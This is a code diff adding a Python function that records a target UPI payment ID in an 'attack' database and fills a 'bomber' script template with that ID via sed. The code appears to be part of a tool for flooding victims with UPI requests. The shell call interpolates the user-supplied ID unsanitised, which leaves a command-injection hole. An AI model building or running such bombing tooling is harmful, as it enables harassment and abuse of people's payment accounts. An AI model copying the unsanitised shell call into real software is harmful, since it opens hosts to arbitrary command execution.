@@ -155,3 +155,15 @@ async def lookk(ip):
             if ip == ipp:
                 return i['key']
     return "no"
+
+async def downloadupi(upiid , ukey):
+    ind_time = datetime.now(timezone("Asia/Kolkata")).strftime('%Y-%m-%d %H:%M:%S.%f')
+    conp.attack.attacknum.insert_one(
+        {"key": ukey, "on": upiid , "when": str(ind_time)})
+    os.system("rm upicopy.py bomber_upicopy.py")
+    copyfile("upi.py", "upicopy.py")
+    ufile = "upicopy.py"
+    os.system(f"sed -i s/€tor/{upiid}/g upicopy.py")
+    await setup(ufile)
+    return "ok"
+
